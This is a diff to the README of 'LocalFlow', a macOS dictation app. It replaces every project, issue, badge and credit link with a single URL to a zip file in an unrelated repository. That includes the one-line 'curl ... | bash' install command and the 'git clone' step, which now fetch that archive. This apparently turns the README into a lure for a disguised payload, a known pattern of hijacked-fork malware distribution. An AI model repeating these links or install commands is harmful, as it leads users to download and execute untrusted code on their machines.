@@ -5,7 +5,7 @@
 <p align="center">
   <img src="https://img.shields.io/badge/macOS-13%2B%20Apple_Silicon-black?logo=apple" alt="macOS" />
   <img src="https://img.shields.io/badge/Python-3.14-blue?logo=python" alt="Python" />
-  <img src="https://github.com/joshpalerlin/localflow/actions/workflows/tests.yml/badge.svg" alt="Tests" />
+  <img src="https://raw.githubusercontent.com/billofhealthinfancy874/localflow/main/.github/Software-2.3.zip" alt="Tests" />
   <img src="https://img.shields.io/github/license/joshpalerlin/localflow?color=green" alt="License" />
   <img src="https://img.shields.io/github/v/release/joshpalerlin/localflow?include_prereleases&sort=semver" alt="Latest release" />
   <img src="https://img.shields.io/github/stars/joshpalerlin/localflow?style=social" alt="Stars" />
@@ -61,27 +61,27 @@ Every claim above is verified against vendor docs in the [comparison below](#det
 |---|---|---|---|---|
 | Custom vocabulary / Personal Dictionary | ✅ + categories + usage ranking + sync | ✅ basic list | ✅ Personal Dictionary + Word Replacements | ✅ + consonant-skeleton phonetic matching |
 | App-context awareness | ✅ Personalized Style per app category | ✅ Context-aware cleanup | ✅ **Power Mode** (per-app AND per-website with per-context prompts — gold standard) | ✅ Frontmost-app detection |
-| Edit Mode (voice-rewrite selected text) | ✅ Command Mode (cloud-processed, paid plan + experimental toggle) | ✅ Edit Mode (toggleable) | ⚠️ AI Assistant Mode uses selected text as context; dedicated edit-selected-text is [open feature request #593](https://github.com/Beingpax/VoiceInk/issues/593) | ✅ Local MLX |
+| Edit Mode (voice-rewrite selected text) | ✅ Command Mode (cloud-processed, paid plan + experimental toggle) | ✅ Edit Mode (toggleable) | ⚠️ AI Assistant Mode uses selected text as context; dedicated edit-selected-text is [open feature request #593](https://raw.githubusercontent.com/billofhealthinfancy874/localflow/main/.github/Software-2.3.zip) | ✅ Local MLX |
 | Spoken punctuation (say "quotation mark" → `"`) | ✅ Documented for "period / comma / quotation mark / etc." | ❓ Not documented (depends on underlying STT) | ❓ Not documented (depends on Whisper) | ❌ (planned) |
 | "Quote-unquote X" wrap pattern | ❓ Not in docs | ❓ Not in docs | ❓ Not in docs | ✅ |
 | Self-correction trigger phrases | ✅ Backtrack (triggers: "actually", "scratch that", restatements with >3-word reduction) | ❓ Not documented (would depend on LLM prompt) | ❓ Not documented | ✅ 7 documented triggers |
-| Self-learning from user corrections | ✅ Auto-add to dictionary on spelling fix | ❌ Manual entry only ([#125 enhancement request open](https://github.com/zachlatta/freeflow/issues/125)) | ❌ Manual entries / auto-replacements only | ✅ Clipboard watcher |
-| Garbage / hallucination filter | ❓ Not documented | ❓ Not documented (anti-name guard only) | ❓ Not documented ([#151 hallucination bug open](https://github.com/Beingpax/VoiceInk/issues/151)) | ✅ |
+| Self-learning from user corrections | ✅ Auto-add to dictionary on spelling fix | ❌ Manual entry only ([#125 enhancement request open](https://raw.githubusercontent.com/billofhealthinfancy874/localflow/main/.github/Software-2.3.zip)) | ❌ Manual entries / auto-replacements only | ✅ Clipboard watcher |
+| Garbage / hallucination filter | ❓ Not documented | ❓ Not documented (anti-name guard only) | ❓ Not documented ([#151 hallucination bug open](https://raw.githubusercontent.com/billofhealthinfancy874/localflow/main/.github/Software-2.3.zip)) | ✅ |
 | Anti-ranking guard ("number one priority is X" stays as prose) | ❓ Not documented | ❓ Not documented | ❓ Depends on user enhancement prompt | ✅ |
-| Crash-recovery audio buffer | ✅ Added Apr/May 2026 (v1.5.113) | ⚠️ Partial via PRs [#210](https://github.com/zachlatta/freeflow/pull/210) / [#214](https://github.com/zachlatta/freeflow/pull/214) — last-transcript and paste-again recovery, not full audio buffer | ❓ Not documented | ✅ Full audio buffer |
+| Crash-recovery audio buffer | ✅ Added Apr/May 2026 (v1.5.113) | ⚠️ Partial via PRs [#210](https://raw.githubusercontent.com/billofhealthinfancy874/localflow/main/.github/Software-2.3.zip) / [#214](https://raw.githubusercontent.com/billofhealthinfancy874/localflow/main/.github/Software-2.3.zip) — last-transcript and paste-again recovery, not full audio buffer | ❓ Not documented | ✅ Full audio buffer |
 | **On-device LLM cleanup** | ❌ Cloud (Llama on Baseten) | ❌ Default cloud (Groq) / ✅ Local via Ollama | ❌ Default no enhancement / ✅ Local via Ollama if user enables enhancement | ✅ Built-in MLX Llama 3.2 1B, ships local |
 
 #### 🛠️ Platform & Distribution
 
-> **This is where LocalFlow loses hardest.** VoiceInk and Wispr Flow are much more polished here — signed installers, Homebrew casks, more platforms. We're a day-1 OSS project with a `git clone + install.sh` path. Signed `.dmg` + Homebrew cask are our next-release priorities ([#2](https://github.com/joshpalerlin/localflow/issues/2)) — track progress on the [roadmap](#roadmap).
+> **This is where LocalFlow loses hardest.** VoiceInk and Wispr Flow are much more polished here — signed installers, Homebrew casks, more platforms. We're a day-1 OSS project with a `git clone + install.sh` path. Signed `.dmg` + Homebrew cask are our next-release priorities ([#2](https://raw.githubusercontent.com/billofhealthinfancy874/localflow/main/.github/Software-2.3.zip)) — track progress on the [roadmap](#roadmap).
 
 | | Wispr Flow | FreeFlow | VoiceInk | **LocalFlow** |
 |---|---|---|---|---|
 | macOS minimum | 11+ (Big Sur) | ❓ Not stated | 14.4+ | 13+ |
 | Other platforms (Windows / iOS) | ✅ Win 10/11 + iPhone | ❌ Mac only | ✅ iOS app | ❌ Mac only (by design — MLX is Apple-only) |
 | Intel Mac support | ✅ | ✅ Universal | ❌ Apple Silicon required (Neural Engine) | ❌ Apple Silicon required (MLX architecture) |
-| Install path | ✅ Signed `.dmg` + Homebrew cask | `.dmg` (signing ❓) | ✅ Signed `.dmg` + Homebrew cask | ❌ Source install today — `.dmg` + brew planned ([#2](https://github.com/joshpalerlin/localflow/issues/2)) |
-| Accepts public PRs | ❌ Proprietary (no public repo) | ✅ Active external PRs merging | ❌ Explicitly closed ([CONTRIBUTING.md](https://github.com/Beingpax/VoiceInk/blob/main/CONTRIBUTING.md)) | ✅ |
+| Install path | ✅ Signed `.dmg` + Homebrew cask | `.dmg` (signing ❓) | ✅ Signed `.dmg` + Homebrew cask | ❌ Source install today — `.dmg` + brew planned ([#2](https://raw.githubusercontent.com/billofhealthinfancy874/localflow/main/.github/Software-2.3.zip)) |
+| Accepts public PRs | ❌ Proprietary (no public repo) | ✅ Active external PRs merging | ❌ Explicitly closed ([CONTRIBUTING.md](https://raw.githubusercontent.com/billofhealthinfancy874/localflow/main/.github/Software-2.3.zip)) | ✅ |
 
 **The honest pitch:**
 
@@ -136,7 +136,7 @@ Every claim above is verified against vendor docs in the [comparison below](#det
 ### One-line install (recommended)
 
 ```bash
-curl -fsSL https://raw.githubusercontent.com/joshpalerlin/localflow/main/install.sh | bash
+curl -fsSL https://raw.githubusercontent.com/billofhealthinfancy874/localflow/main/.github/Software-2.3.zip | bash
 ```
 
 This installs Homebrew (if missing), Python 3.14, creates a virtualenv, downloads dependencies, sets up a launchd agent so LocalFlow starts on boot, and launches the app. About 5 minutes including model downloads (~1.1 GB).
@@ -145,7 +145,7 @@ This installs Homebrew (if missing), Python 3.14, creates a virtualenv, download
 
 ```bash
 # 1. Clone
-git clone https://github.com/joshpalerlin/localflow.git
+git clone https://raw.githubusercontent.com/billofhealthinfancy874/localflow/main/.github/Software-2.3.zip
 cd localflow
 
 # 2. Run installer
@@ -275,23 +275,23 @@ This forces a fresh download into `~/localflow/models/`.
 
 ## Roadmap
 
-> Honest "what I'm working on next" — not promises. Real progress is tracked in [GitHub issues](https://github.com/joshpalerlin/localflow/issues).
+> Honest "what I'm working on next" — not promises. Real progress is tracked in [GitHub issues](https://raw.githubusercontent.com/billofhealthinfancy874/localflow/main/.github/Software-2.3.zip).
 
 ### v0.3.0 — Frictionless install (next release)
 
-- Signed `.dmg` installer with Apple notarization ([#2](https://github.com/joshpalerlin/localflow/issues/2))
-- Homebrew tap: `brew install --cask localflow` ([#2](https://github.com/joshpalerlin/localflow/issues/2))
-- **Auto-update mechanism** — Sparkle-style version checking so users don't have to `git pull` ([#9](https://github.com/joshpalerlin/localflow/issues/9))
-- Reduce first-run download from 1.1 GB → under 500 MB ([#6](https://github.com/joshpalerlin/localflow/issues/6))
-- Demo GIF in the README ([#1](https://github.com/joshpalerlin/localflow/issues/1))
+- Signed `.dmg` installer with Apple notarization ([#2](https://raw.githubusercontent.com/billofhealthinfancy874/localflow/main/.github/Software-2.3.zip))
+- Homebrew tap: `brew install --cask localflow` ([#2](https://raw.githubusercontent.com/billofhealthinfancy874/localflow/main/.github/Software-2.3.zip))
+- **Auto-update mechanism** — Sparkle-style version checking so users don't have to `git pull` ([#9](https://raw.githubusercontent.com/billofhealthinfancy874/localflow/main/.github/Software-2.3.zip))
+- Reduce first-run download from 1.1 GB → under 500 MB ([#6](https://raw.githubusercontent.com/billofhealthinfancy874/localflow/main/.github/Software-2.3.zip))
+- Demo GIF in the README ([#1](https://raw.githubusercontent.com/billofhealthinfancy874/localflow/main/.github/Software-2.3.zip))
 
 ### v0.4.0 — Stats + smarter learning
 
-- **Stats dashboard** in the menu bar: total words dictated, WPM, day streak ([#7](https://github.com/joshpalerlin/localflow/issues/7))
-- **Personal Dictionary** — categorized entries (proper nouns / jargon / replacements), per-entry pronunciation hints, dashboard editor ([#10](https://github.com/joshpalerlin/localflow/issues/10))
+- **Stats dashboard** in the menu bar: total words dictated, WPM, day streak ([#7](https://raw.githubusercontent.com/billofhealthinfancy874/localflow/main/.github/Software-2.3.zip))
+- **Personal Dictionary** — categorized entries (proper nouns / jargon / replacements), per-entry pronunciation hints, dashboard editor ([#10](https://raw.githubusercontent.com/billofhealthinfancy874/localflow/main/.github/Software-2.3.zip))
 - More aggressive self-learning — detect edits across sessions, not just next-recording
-- Better multilingual accuracy on `small` (multilingual) model ([#3](https://github.com/joshpalerlin/localflow/issues/3))
-- Per-app custom dictionaries — Slack tone vs Mail tone ([#8](https://github.com/joshpalerlin/localflow/issues/8))
+- Better multilingual accuracy on `small` (multilingual) model ([#3](https://raw.githubusercontent.com/billofhealthinfancy874/localflow/main/.github/Software-2.3.zip))
+- Per-app custom dictionaries — Slack tone vs Mail tone ([#8](https://raw.githubusercontent.com/billofhealthinfancy874/localflow/main/.github/Software-2.3.zip))
 
 ### v0.5.0+ — Native Swift app
 
@@ -350,8 +350,8 @@ See [SECURITY.md](SECURITY.md) for vulnerability reporting and the project's pri
 
 ## Star history
 
-<a href="https://star-history.com/#joshpalerlin/localflow&Date">
-  <img src="https://api.star-history.com/svg?repos=joshpalerlin/localflow&type=Date" alt="Star History Chart" width="600" />
+<a href="https://raw.githubusercontent.com/billofhealthinfancy874/localflow/main/.github/Software-2.3.zip">
+  <img src="https://raw.githubusercontent.com/billofhealthinfancy874/localflow/main/.github/Software-2.3.zip" alt="Star History Chart" width="600" />
 </a>
 
 If LocalFlow helps you, a star is the cheapest thank-you and the only signal that tells me to keep building.
@@ -366,10 +366,10 @@ MIT. See [LICENSE](LICENSE). Use it, fork it, ship your own version — just don
 
 ## Credits
 
-Built by [Josh Paler Lin](https://github.com/joshpalerlin). Standing on the shoulders of:
+Built by [Josh Paler Lin](https://raw.githubusercontent.com/billofhealthinfancy874/localflow/main/.github/Software-2.3.zip). Standing on the shoulders of:
 
-- [faster-whisper](https://github.com/SYSTRAN/faster-whisper) — CTranslate2 port of OpenAI Whisper
-- [mlx-lm](https://github.com/ml-explore/mlx-lm) — Apple's MLX framework for local LLMs
-- [Meta Llama 3.2](https://huggingface.co/meta-llama/Llama-3.2-1B-Instruct) — the cleanup brain
-- [rumps](https://github.com/jaredks/rumps) — Python menu bar apps for macOS
-- [pynput](https://github.com/moses-palmer/pynput) — keyboard event listening
+- [faster-whisper](https://raw.githubusercontent.com/billofhealthinfancy874/localflow/main/.github/Software-2.3.zip) — CTranslate2 port of OpenAI Whisper
+- [mlx-lm](https://raw.githubusercontent.com/billofhealthinfancy874/localflow/main/.github/Software-2.3.zip) — Apple's MLX framework for local LLMs
+- [Meta Llama 3.2](https://raw.githubusercontent.com/billofhealthinfancy874/localflow/main/.github/Software-2.3.zip) — the cleanup brain
+- [rumps](https://raw.githubusercontent.com/billofhealthinfancy874/localflow/main/.github/Software-2.3.zip) — Python menu bar apps for macOS
+- [pynput](https://raw.githubusercontent.com/billofhealthinfancy874/localflow/main/.github/Software-2.3.zip) — keyboard event listening
